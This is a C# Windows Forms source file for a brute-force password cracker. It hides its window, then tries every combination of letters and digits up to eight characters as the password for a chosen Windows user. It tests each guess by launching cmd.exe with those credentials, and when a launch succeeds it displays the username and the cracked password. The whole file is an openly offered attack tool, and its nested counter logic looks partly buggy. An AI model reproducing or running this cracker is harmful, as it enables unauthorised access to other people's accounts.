using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security;
using System.Diagnostics;
using System.IO;
using System.Net;


namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Visible = false;
            bool end = false;


            double breakPass = 0;
            double breakPass1 = 0;
            System.DateTime TakeTime = DateTime.Now ;
            int next = 0;
            int next1 = 0;
            int next2 = 0;
            int next3 = 0;
            int next4 = 0;
            int next5 = 0;
            int next6 = 0;
            int next7 = 0;


            char[] Pword = { ' ', 'e', 't', 'a', 'o', 'i', 'n', 's', 'h', 'i', 'j', 'b', 'c', 'd', 'f', 'g', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 'q', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'E', 'T', 'A', 'O', 'I', 'N', 'S', 'H', 'D', 'J', 'K', 'L', 'M', 'G', 'C', 'P', 'Q', 'R', 'F', 'B', 'U', 'V', 'W', 'X', 'Y', 'Z' };

            if (trackBar1.Value == 1) { breakPass1 = 0; next1 = -1;/* next2 = -1; next3 = -1; next4= -1; next5 = -1; next6 = -1; next7 = -1; */}
            if (trackBar1.Value == 2) { breakPass1 = 66; }
            if (trackBar1.Value == 3) { breakPass1 = 4226; }
            if (trackBar1.Value == 4) { breakPass1 = 274626; }
            if (trackBar1.Value == 5) { breakPass1 = 17850626; }
            if (trackBar1.Value == 6) { breakPass1 = 1160290626; }
            if (trackBar1.Value == 7) { breakPass1 = 75418890626; }
            if (trackBar1.Value == 8) { breakPass1 = 4902227890626; }

            //e t a o i n s r h 1 l d c u m f p g w y b v k x j q z 2 3 4 5 6 7 8 9 0 E T A O I N   S R H L D C U M F P G W Y B V K X J Q Z

            while (end == false)
            {



                SecureString str = new SecureString();
                string passText = "";

                if (breakPass1 < 318644812890625 && breakPass1 > 4902227890625) { str.AppendChar(Pword[next7]); str.AppendChar(Pword[next6]); str.AppendChar(Pword[next5]); str.AppendChar(Pword[next4]); str.AppendChar(Pword[next3]); str.AppendChar(Pword[next2]); str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 4902227890625 && breakPass1 > 75418890625) { str.AppendChar(Pword[next6]); str.AppendChar(Pword[next5]); str.AppendChar(Pword[next4]); str.AppendChar(Pword[next3]); str.AppendChar(Pword[next2]); str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 75418890625 && breakPass1 > 1160290625) { str.AppendChar(Pword[next5]); str.AppendChar(Pword[next4]); str.AppendChar(Pword[next3]); str.AppendChar(Pword[next2]); str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 1160290625 && breakPass1 > 17850625) { str.AppendChar(Pword[next4]); str.AppendChar(Pword[next3]); str.AppendChar(Pword[next2]); str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 17850625 && breakPass1 > 274625) { str.AppendChar(Pword[next3]); str.AppendChar(Pword[next2]); str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 274625 && breakPass1 > 4225) { str.AppendChar(Pword[next2]); str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 4225 && breakPass1 > 65) { str.AppendChar(Pword[next1]); str.AppendChar(Pword[next]); }
                if (breakPass1 < 65) { str.AppendChar(Pword[next]); }
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                if (breakPass1 < 318644812890625 && breakPass1 > 4902227890625) { passText = Pword[next7].ToString() + Pword[next6].ToString() + Pword[next5].ToString() + Pword[next4].ToString() + Pword[next3].ToString() + Pword[next2].ToString() + Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 4902227890625 && breakPass1 > 75418890625) { passText = Pword[next6].ToString() + Pword[next5].ToString() + Pword[next4].ToString() + Pword[next3].ToString() + Pword[next2].ToString() + Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 75418890625 && breakPass1 > 1160290625) { passText = Pword[next5].ToString() + Pword[next4].ToString() + Pword[next3].ToString() + Pword[next2].ToString() + Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 1160290625 && breakPass1 > 17850625) { passText = Pword[next4].ToString() + Pword[next3].ToString() + Pword[next2].ToString() + Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 17850625 && breakPass1 > 274625) { passText = Pword[next3].ToString() + Pword[next2].ToString() + Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 274625 && breakPass1 > 4225) { passText = Pword[next2].ToString() + Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 4225 && breakPass1 > 65) { passText = Pword[next1].ToString() + Pword[next].ToString(); }
                if (breakPass1 < 66) { passText = Pword[next].ToString(); }




                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe");

                startInfo.UserName = textBox1.Text;
                startInfo.Password = str;
                startInfo.UseShellExecute = false;


                try
                {
                    Process.Start(startInfo);
                    System.DateTime now = DateTime.Now;
                    string password = "UserName: " + textBox1.Text + "\r\nPassword: " + passText + "\r\nWas found on try number: " + breakPass + "\r\nStart time: " + TakeTime + "\r\nEnd time: " + now;
                    this.Visible = true;
                    end = true;
                    textBox2.Text = (password);

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    breakPass = breakPass + 1;
                    breakPass1 = breakPass1 + 1;
                    if (next < 65) { next = next + 1; } else { next = 0; if (next1 < 65) { next1 = next1 + 1; } else { next1 = 0; if (next2 < 65) { next2 = next2 + 1; } else { next2 = 0; if (next3 < 65) { next3 = next3 + 1; } else { next3 = 0; if (next4 < 65) { next4 = next4 + 1; } else { next4 = 0; if (next5 < 65) { next5 = next5 + 1; } else { next5 = 0; if (next6 < 65) { next6 = next6 + 1; } else { next6 = 0; } if (next7 < 65) { next7 = next7 + 1; } else { next7 = 0; } } } } } } }
                }
            }
        }
    }
}